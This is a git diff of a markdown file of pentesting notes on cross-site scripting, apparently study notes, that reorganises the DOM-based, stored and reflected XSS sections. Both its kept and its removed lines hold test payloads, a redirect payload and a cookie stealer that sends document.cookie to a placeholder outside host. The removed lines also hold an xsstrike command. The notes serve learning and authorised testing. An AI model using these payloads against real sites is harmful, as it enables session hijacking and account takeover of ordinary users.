@@ -24,8 +24,7 @@ Test with JS
 <script> var i = new Image; i.src="<Your website>/?"+document.cookie;</script>
 ```
 
-## Discovery
-### DOM-Based
+## DOM-Based
 > Done completely in the client browser. No request to server on data entry. Easily confused for relfected XSS. Needs a trigger to run the payload, such as 'img src=""'
 * Test Payloads 
 ```javascript
@@ -38,37 +37,18 @@ Test with JS
 # Send the user to another site 
 <img src=x onerror="window.location.href='https://google.com'">
 ```
-### Stored XSS
-> Can be verified if its persistent across sessions. For example, if you upload `<h1>test</h1>` and open the same page in an incognito window or another browser and it remains. Useful for stealing session cookies.
-* Test Payloads  
 
-Test with HTML first
-```html
-# Should appear as a heading on the page
-<h1>test</h1>
-```
-Test with javascript
-```javascript
-# Should pop the print dialog for every user that visits the page.
-<script>print(1)</script>
+## Reflected
+> Reflected - Gets Processed by the back-end server DOM-based - Completely Processed on the client-side Neither are persistent through a page refresh
+> Look for user input to be displayed as part of error messages
+> to target a user, send them a link containing our payload
+### Test Payloads
+Same as with Stored XSS
 
-# Tries to pring the session cookie
-<script>print(document.cookie)</script>
-
-# Common Cookie Stealer
-<script> var i = new Image; i.src="<Your website>/?"+document.cookie;</script>
-```
-### xsstrike.py
-```bash
-python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
-```
-### Manual
+## Links to test payloads
 Manually test payloads against input fields
 [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
 [PayloadBox](https://github.com/payloadbox/xss-payload-list)
-
-### Code Review
-Review the source code for the page and the JS in Developer Tools
 
 ## Session Hijacking (Stealing Session Cookie)
 ### Blind XSS Detection
@@ -212,26 +192,6 @@ document.getElementsByTagName('body')[0].innerHTML = "New Text"
 ```
 
 To verify the payload is stored on the back-end, refresh the page. If the alert comes back, it's stored/persistent
-
-## Reflected XSS
-Reflected - Gets Processed by the back-end server
-DOM-based - Completely Processed on the client-side
-Neither are persistent through a page refresh
-
-### Reflected
-Look for user input to be displayed as part of an error messages
-
-Test Payloads
-
-```html
-<script>alert(window.origin)</script> # This will pop up a window showing the source URL for the popup window(iframes)
-<script>print()</script> # Will pop up the printer dialog
-<plaintext> # Should render the rest of the page as plain text.
-```
-Payloads will **NOT** be rendered by the browser on execution
-
-**Targeting**
-Target users by sending them a GET-Request URL containing our payload
 
 ### DOM-Based
 Completely Processed on the client side (JS used to change page source through the Document Object Model(DOM)
